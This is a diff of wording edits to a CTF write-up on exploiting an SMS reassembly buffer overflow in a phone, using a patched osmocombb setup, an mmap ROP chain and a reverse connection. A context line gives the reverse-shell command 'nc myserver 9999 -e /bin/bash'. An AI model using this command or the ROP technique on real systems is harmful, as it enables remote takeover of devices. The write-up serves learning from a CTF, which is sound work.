@@ -168,13 +168,13 @@ This code is actually reconstructing the SMS from all its parties. Copying the r
 `seqnum` is a value that we can control arbitrarily. Even if we are limited to only 3 parts we can specify that we are sending part number 4 and this will cause the memcpy to write outside the allocated buffer writing the return address on the stack gaining control of the `PC`.
 
 ## Communicate with the phone
-We need to be able to send SMS to this phone to actually exploit the vulnerability. Thankfully the author provided us with a full setup that also contains configured version of osmocombb(add link here) software.
+We need to be able to send SMS to this phone to actually exploit the vulnerability. Thankfully the author provided us with a full setup that also contains configured version of [`osmocombb`]({{"https://github.com/osmocom/osmocom-bb"|absolute_url}}) software.
 
 After a while playing with these software (and actually reading the source code) I found that if you type enable in the console you can use the `sms` command to send some SMSes.
-The problem was that the interface was very limited. It was sending only single sms with the 7bit encoding scheme and was accepting only ASCII character. I needed to be more flexible to be able to produce multi-part sms.
-I tried to sniff the output of osmocombb to be able to write a python script. But I quickly discovered that the full gsm protocol is involved. 
-This includes asking and obtaining a channel to actually communicate with the baseband. Implementing all this stuff was time requiring and, in ctf, you do not have much time. 
-So I decided to patch osmocombb software to implement a command that let me send more customizable sms.
+The problem was that the interface was very limited. It was sending only single sms with the 7bit encoding scheme and was accepting only ASCII character. I needed to be more flexible to be able to produce multi-part SMSes.
+I tried to sniff the output of `osmocombb` to be able to write a python script. But I quickly discovered that the full gsm protocol was involved.
+This includes asking and obtaining a channel to actually communicate with the baseband. Implementing all this stuff was time consuming and, in ctf, you do not have much time. 
+So I decided to patch `osmocombb` software to implement a command that let me send more customizable sms.
 
 Full patch is available [`here`]({{"/assets/code/newphonewhodis_writeup/osmocombb_path.diff"|absolute_url}}). The interesting stuff is:
 
@@ -231,7 +231,8 @@ The phone had Internet access and also `nc` installed. So the plan was to execut
 system("nc myserver 9999 -e /bin/bash");
 ```
 
-`system` was not in the .got so I need to do some computation from a value in the got, this stuff is hard while ropping, so the exploitation plan was: let's map some executable address and write a shellcode that does a reverse connection.
+`system` was not in the .got so I need to do some computation from a value in the got to get the address for `system`. 
+This stuff is hard while ropping, so the exploitation plan was slightly different: Let's map some executable address and write a shellcode that does a reverse connection.
 
 So, I collected a few gadgets and built the ropachain that execute a `mmap` on an address the I can choose. Permissions for this new page are of course `RWX`.
 
@@ -315,8 +316,9 @@ ropchain += p32(0x41414141) #pc
 ### Gaining back PC Control
 The main problem was that `mmap` assumed to be called with a `BLX`, ergo it will return to the value inside the `lr` register. 
 For whatever reason that I do not know `lr` register was set to `0x3f` so a direct jump to `mmap` would cause a crash at the end.
-Instead of jumping directly to `mmap` then, we can use a call of `mmap` that is already in the program somewhere. This, after the execution of the `mmap`, would continue the execution in that part of the program.
-Then we just need to not have the program crash before reaching another return that do not use link register.
+Instead of jumping directly to `mmap` then, we can use a call of `mmap` that is already in the program somewhere.
+This, after the execution of the `mmap`, would continue the execution in that part of the program.
+Then we just need to have the program not crashing before reaching another return that do not use link register.
 I jumped to `0x00013E0C +1`.
 
 ```c
@@ -328,8 +330,8 @@ I jumped to `0x00013E0C +1`.
 .text:00013E12 200 STR             R0, [R4,#0x5C] ; Store to Memory
 .text:00013E14 200 BEQ.W           loc_140F0 ; Bran
 ```
-To ensure that the execution would continue without crash I tried to set all register that I was writing to `address` that would be a valid memory so read and write differentiating those registers would not crash.
-This actually worked. I manually executed my payload with gdb until the program was popping another value from the stack to the `PC` register. 
+To ensure that the execution would continue without crashing, I tried to set most registers to `address`. In this way, instructions differentiating those registers would not end up crashing.
+This actually (and surprisingly) worked. I manually executed my payload with gdb until the program was popping another value from the stack to the `PC` register. 
 I save the address did some math to understand how far it was from the vulnerable buffer. With an sms in position `8` we can gain back control of `PC` register.
 
 ### Second Payload
